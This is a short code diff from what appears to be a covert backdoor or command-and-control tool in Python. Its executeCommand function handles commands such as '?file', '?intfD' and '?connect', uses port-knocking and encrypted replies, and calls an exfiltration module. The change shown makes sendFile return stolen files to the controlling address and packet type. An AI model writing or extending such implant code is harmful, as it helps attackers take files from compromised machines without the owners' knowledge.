@@ -226,7 +226,7 @@ def executeCommand(srcAddress, pacType, command):
 	elif "?intfD " in command:
 		exfil.removeWatch(command[7:])
 	elif "?file " in command:
-		exfil.sendFile(command[6:])
+		exfil.sendFile(command[6:], srcAddress, pacType)
 	elif "?connect" in command:
 		knockCode(srcAddress, pacType, True)
 		for c in utils.encryptData("Connected: "):
